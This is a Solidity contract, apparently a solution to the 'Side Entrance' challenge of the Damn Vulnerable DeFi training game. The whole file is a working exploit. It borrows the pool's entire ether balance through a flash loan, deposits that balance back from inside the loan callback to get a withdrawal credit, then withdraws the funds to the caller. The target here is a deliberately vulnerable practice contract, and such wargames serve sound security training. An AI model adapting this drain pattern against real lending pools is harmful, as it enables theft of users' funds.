// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract Attacker is IFlashLoanEtherReceiver {
    SideEntranceLenderPool immutable pool;

    constructor(SideEntranceLenderPool pool_) {
        pool = pool_;
    }

    function execute() external payable {
        pool.deposit{value: address(this).balance}();
    }

    function attack() external payable {
        pool.flashLoan(address(pool).balance);
    }

    function withdraw() external {
        pool.withdraw();
        msg.sender.call{value: address(this).balance}("");
    }

    receive() external payable {}
}
